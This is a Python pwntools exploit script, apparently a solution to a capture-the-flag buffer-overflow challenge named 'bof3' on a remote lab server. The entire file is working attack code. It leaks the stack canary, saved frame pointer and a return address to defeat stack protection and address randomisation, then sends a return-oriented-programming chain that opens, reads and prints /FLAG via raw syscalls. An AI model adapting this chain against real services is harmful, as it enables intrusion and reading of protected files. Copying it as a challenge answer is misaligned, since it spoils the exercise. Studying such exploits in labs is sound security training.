from pwn import *

context.arch = 'amd64'
context.os = 'linux'
# context.log_level = 'debug'

ELF_PATH = "./bof3"
USE_REMOTE = True
HOST = "up.zoolab.org"
PORT = 12344

# === Offsets & constants ===
OFFSET_CANARY = 0xc0 - 7  # input size before canary leak
OFFSET_RBP_LEAK = 0x90    # input size for leaking RBP
OFFSET_RETADDR_LEAK = 48*2 + 8  # buf1 + buf2 + saved rbp

RET_OFFSET_MAIN = 0x9c83
SYSCALL_OFFSET = 0x30ba6
MSG_OFFSET_FROM_RBP = 0x30
BSS_OFFSET = 0xef200

elf = ELF(ELF_PATH)
rop = ROP(elf)

def connect():
    if USE_REMOTE:
        return remote(HOST, PORT)
    else:
        return process(ELF_PATH)

def leak_canary(io):
    io.sendafter(b"What's your name? ", b"A" * OFFSET_CANARY)
    io.recvuntil(b"Welcome, ")
    leak = io.recvline().strip()
    canary = b'\x00' + leak[185:192]
    canary = u64(canary.ljust(8, b'\x00'))
    log.success(f"Leaked canary: 0x{canary:016x}")
    return canary

def leak_rbp(io):
    io.sendafter(b"What's the room number? ", b"B" * OFFSET_RBP_LEAK)
    io.recvuntil(b"The room number is: ")
    leak = io.recvline().strip()
    rbp = u64(leak[-6:].ljust(8, b'\x00')) - 16
    log.success(f"Leaked rbp: 0x{rbp:016x}")
    return rbp

def leak_ret(io):
    io.sendafter(b"What's the customer's name? ", b"B" * OFFSET_RETADDR_LEAK)
    leak = io.recvline().strip()
    ret_addr = u64(leak[-6:].ljust(8, b'\x00'))
    log.success(f"Leaked return address: {hex(ret_addr)}")
    return ret_addr

def build_rop(canary, rbp, pie_base):
    flag_buf = rbp - 0x90
    msg_addr = rbp - MSG_OFFSET_FROM_RBP

    pop_rdi = pie_base + rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rsi = pie_base + rop.find_gadget(['pop rsi', 'ret'])[0]
    pop_rdx = pie_base + rop.find_gadget(['pop rdx', 'ret'])[0]
    pop_rax = pie_base + rop.find_gadget(['pop rax', 'ret'])[0]
    syscall = pie_base + SYSCALL_OFFSET

    payload  = b"/FLAG\x00"
    payload += b"D" * (40 - len(payload))
    payload += p64(canary)
    payload += b"Z" * 8  # saved rbp (junk)

    payload += flat(
        # open("/FLAG", 0)
        pop_rdi, msg_addr,
        pop_rsi, 0,
        pop_rax, 2,
        syscall,

        # read(fd=3, buf, 100)
        pop_rdi, 3,
        pop_rsi, flag_buf,
        pop_rdx, 100,
        pop_rax, 0,
        syscall,

        # write(1, buf, 100)
        pop_rdi, 1,
        pop_rsi, flag_buf,
        pop_rdx, 100,
        pop_rax, 1,
        syscall,

        # exit(0)
        pop_rax, 60,
        pop_rdi, 0,
        syscall
    )
    return payload

def main():
    io = connect()
    canary = leak_canary(io)
    rbp = leak_rbp(io)
    ret_addr = leak_ret(io)

    pie_base = ret_addr - RET_OFFSET_MAIN
    log.info(f"PIE base = {hex(pie_base)}")

    rop_payload = build_rop(canary, rbp, pie_base)

    # Final stage: send payload
    io.sendafter(b"Leave your message: ", rop_payload)

    flag = io.recvall(timeout=2).decode(errors='ignore')
    print(flag.strip())

if __name__ == "__main__":
    main()
